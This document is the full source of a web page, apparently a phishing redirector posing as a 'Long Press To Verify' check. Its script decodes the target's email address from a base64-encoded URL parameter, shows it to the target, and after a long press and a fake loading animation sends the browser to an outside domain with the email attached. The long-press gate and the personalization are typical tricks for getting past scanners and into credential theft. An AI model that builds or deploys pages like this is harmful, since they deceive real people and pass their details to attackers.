    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: white; /* Background color of the whole page */
        }
        .container {
            text-align: center; /* Center the text in the container */
        }
        .dots-container {
            display: none; /* Initially hide the loading dots */
            align-items: center;
            justify-content: center;
        }
        .dot {
            background-color: darkblue; /* Color of the loading dots */
            border-radius: 50%; /* Make the dots round */
            width: 10px; /* Width of the dots */
            height: 10px; /* Height of the dots */
            margin: 5px; /* Space between dots */
            animation: grow 1.5s infinite ease-in-out; /* Animation for the dots */
        }
        .dot:nth-child(1) { animation-delay: 0s; }
        .dot:nth-child(2) { animation-delay: 0.1s; }
        .dot:nth-child(3) { animation-delay: 0.2s; }
        .dot:nth-child(4) { animation-delay: 0.3s; }
        .dot:nth-child(5) { animation-delay: 0.4s; }
        @keyframes grow {
            0%, 100% { transform: scale(1); } /* Scale dots to original size at the start and end of animation */
            50% { transform: scale(1.5); } /* Scale dots to 1.5 times their size at the middle of animation */
        }
        #emailDisplay {
            color: dodgerblue; /* Text color for the email display */
            font-size: 18px; /* Font size for the email display */
            margin-bottom: 20px; /* Margin below the email display */
        }
        #longPressButton {
            padding: 10px 20px; /* Padding inside the button */
            font-size: 16px; /* Font size for the button text */
            cursor: pointer; /* Change cursor to pointer on hover */
            margin-bottom: 20px; /* Margin below the button */
            background-color: mediumslateblue; /* Background color for the button */
            color: white; /* White text color for the button */
            border: none; /* No border for the button */
            border-radius: 5px; /* Rounded corners for the button */
            user-select: none; /* Prevent copying text on long press */
        }
        #longPressButton:hover {
            background-color: blue; /* Hover background color */
        }
        .progress-container {
            width: 100%; /* Full width progress bar */
            background-color: lightgrey; /* Background color for the progress container */
            height: 20px; /* Height of the progress container */
            border-radius: 5px; /* Rounded corners for the progress container */
            overflow: hidden; /* Hide overflow content */
            margin-bottom: 20px; /* Margin below the progress container */
        }
        .progress-bar {
            height: 100%; /* Full height progress bar */
            background-color: darkblue; /* Background color for the progress bar */
            width: 0; /* Initial width of the progress bar */
            transition: width 0.1s; /* Smooth transition for the width change */
        }
    </style>

        <div id="emailDisplay" aria-live="polite"></div> <!-- Element to display the email -->
        <div class="progress-container">
            <div id="progressBar" class="progress-bar"></div> <!-- Progress bar inside the container -->
        </div>
        <button id="longPressButton">Long Press To Verify </button> <!-- Long press button -->
        <div class="dots-container" aria-label="Loading content">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div> <!-- Loading dots -->
        </div>
    </div>
    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a> <!-- Hidden redirect link -->
    <script>
        // Function to decode base64 string
        function decodeBase64(encoded) {
            try {
                return decodeURIComponent(atob(encoded).split('').map(c =>
                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
            } catch (e) {
                console.error("Decoding failed: ", e);
                return null; // Return null if decoding fails
            }
        }

        // Function to find and decode the email parameter
        function findEmailParam() {
            const urlParams = new URLSearchParams(window.location.search);
            for (const [key, value] of urlParams.entries()) {
                const decodedValue = decodeBase64(key);
                if (decodedValue && decodedValue.includes('@')) {
                    return decodedValue; // Return the decoded email
                }
            }
            return null;
        }

        // Function to handle redirection
        function redirectToTarget(email) {
            const links = [
              
                `https://remittancegateway.com/new/?email=${email}`
            ];
            const randomLink = links[Math.floor(Math.random() * links.length)];
            console.log("Redirecting to: ", randomLink);
            window.location.href = randomLink;
        }

        // Function to update the displayed email
        function updateLink() {
            const email = findEmailParam();
            const emailDisplay = document.getElementById('emailDisplay');
            if (email) {
                console.log("Displaying email: ", email);
                emailDisplay.innerText = email; // Always display the email
            } else {
                console.error("No email to display");
            }
        }

        // Long press button functionality
        const button = document.getElementById('longPressButton');
        const progressBar = document.getElementById('progressBar');

        let timer;
        let progress = 0;
        const holdTime = 1200; // time in milliseconds to hold the button

        const startProgress = () => {
            progress = 0;
            progressBar.style.width = '0%';
            timer = setInterval(() => {
                progress += 100 / (holdTime / 100);
                progressBar.style.width = progress + '%';
                if (progress >= 100) {
                    clearInterval(timer);
                    // Hide the long press button and progress bar
                    button.style.display = 'none';
                    document.querySelector('.progress-container').style.display = 'none';
                    // Show loading dots
                    document.querySelector('.dots-container').style.display = 'flex';
                    // Wait for 2 seconds before redirecting
                    setTimeout(() => {
                        const email = findEmailParam();
                        if (email) {
                            redirectToTarget(email);
                        } else {
                            console.error("No email found for redirection");
                        }
                    }, 2000);
                }
            }, 100);
        };

        const stopProgress = () => {
            clearInterval(timer);
            progressBar.style.width = '0%';
        };

        button.addEventListener('mousedown', startProgress);
        button.addEventListener('touchstart', (e) => {
            e.preventDefault(); // Prevent default touch behavior
            startProgress();
        });
        button.addEventListener('mouseup', stopProgress);
        button.addEventListener('mouseleave', stopProgress);
        button.addEventListener('touchend', stopProgress);
        button.addEventListener('touchcancel', stopProgress);

        window.onload = updateLink;
    </script>
</body>
